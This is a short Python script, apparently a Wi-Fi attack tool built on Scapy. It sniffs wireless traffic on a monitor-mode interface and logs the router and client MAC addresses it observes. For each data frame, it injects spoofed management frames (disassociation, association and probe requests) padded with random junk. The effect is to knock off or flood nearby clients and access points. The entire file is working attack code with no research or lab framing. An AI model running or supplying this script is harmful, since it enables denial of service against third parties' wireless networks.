from scapy.all import *
import time,random,os

print('set interface to:')
a=input('')
mon=a
def packet_handler(packet):
	if packet.haslayer(Dot11):
		def dd(B,st):
			return st.join(chr(random.randint(0,285)) for _ in range(random.randint(32,B)))
		if packet.type == 2 and packet.subtype in [4,10,8]:# and packet.dBm_AntSignal > -60:
			l0=packet.addr1
			l1=packet.addr2
			l2=packet.addr3
			print(f'<SCAN> ROUTER={packet.addr3} ::: CLIENT={packet.addr2} ::: BDCAST={packet.addr1}')
			#print(repr(packet))
			ph=RadioTap()/Dot11(addr1=[l0,l2],addr2=[l1,l2],addr3=[l2,l0],type=0,subtype=[0,4,10])/Raw(dd(B=372,st='\x00'))
			sendp(ph,iface=mon,count=1,verbose=0)
os.system('clear')
print('<INTERFACE> scanning WIFI Access Points..')
sniff(iface=mon,prn=packet_handler)
